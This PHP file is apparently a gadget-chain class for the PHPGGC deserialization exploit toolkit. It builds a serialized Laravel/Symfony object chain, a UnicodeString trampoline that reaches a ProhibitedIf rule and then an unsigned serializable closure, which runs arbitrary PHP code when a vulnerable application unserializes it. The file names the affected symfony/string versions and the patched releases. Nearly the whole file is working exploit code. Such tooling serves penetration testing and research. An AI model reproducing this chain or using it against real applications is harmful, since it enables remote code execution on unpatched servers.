<?php

namespace GadgetChain\Laravel;

class RCE23 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = 'symfony/string 8.0.0 <= 8.0.11';
    public static $vector = '__unserialize';
    public static $author = 'Mechazawa';
    public static $information = '
        Runs arbitrary PHP code through a serialized Laravel closure.

        Symfony\\Component\\String\\UnicodeString is used as a trampoline: its
        typed "string" property coerces the assigned object to a string during
        __unserialize(), which triggers Illuminate\\Validation\\Rules\\ProhibitedIf::
        __toString(). That calls the UnsignedSerializableClosure stored as its
        condition, executing the wrapped closure (no signing key required).

        Requires laravel/serializable-closure. The __unserialize() path (plain
        "string" key) exists from symfony/string 8.0.0, which replaced the
        __sleep/__wakeup() implementation. Symfony hardened the component to
        reject Stringable objects during unserialization (2026-05-23), shipped
        in 8.0.12 / 8.1.0 (and 7.4.13 / 6.4.39 for the __wakeup variant), so
        patched releases are no longer affected.
    ';

    public function generate(array $parameters)
    {
        $native = new \Laravel\SerializableClosure\Serializers\Native($parameters['code']);
        $closure = new \Laravel\SerializableClosure\UnsignedSerializableClosure($native);
        $prohibited = new \Illuminate\Validation\Rules\ProhibitedIf($closure);

        return new \Symfony\Component\String\UnicodeString($prohibited);
    }
}
